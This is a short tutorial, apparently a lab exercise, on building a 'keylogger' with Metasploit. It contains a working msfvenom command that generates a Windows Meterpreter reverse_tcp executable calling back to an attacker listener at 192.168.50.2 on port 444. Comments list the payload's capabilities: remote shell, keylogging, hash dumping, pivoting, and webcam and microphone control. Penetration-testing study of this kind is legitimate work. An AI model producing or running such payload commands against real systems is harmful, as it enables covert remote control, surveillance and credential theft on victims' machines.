Building the keylogger using Metasploit-framework

PART 1
Log in to kali linux software
The aim is to create a payload called Meterpreter using Inbuilt Metasploit-framework (see- https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)

    ## Meterpreter is a Metasploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code ##

Using Meterpreter to generate an executable called keylogger.exe as illustrated before

┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.2 LPORT=444 -f exe -o keylogger.exe

    # p - payload (windows/x64/meterpreter/reverse_tcp) 
    # windows/meterpreter/reverse_tcp is one of the most powerful features the Metasploit Framework has to offer
    # It allows you to remotely control the file system, sniff, keylog, hashdump, perform network pivoting, control the webcam and microphone
    #LHOST - Listen Address (Threat actor IP address)
    #LPORT - Listen port (The default is 444, It is advisable to change to another value)
    #f - To outpute the executable file in exe (Window extension)
    #0 - To outpute the executable file name to keylogger.exe
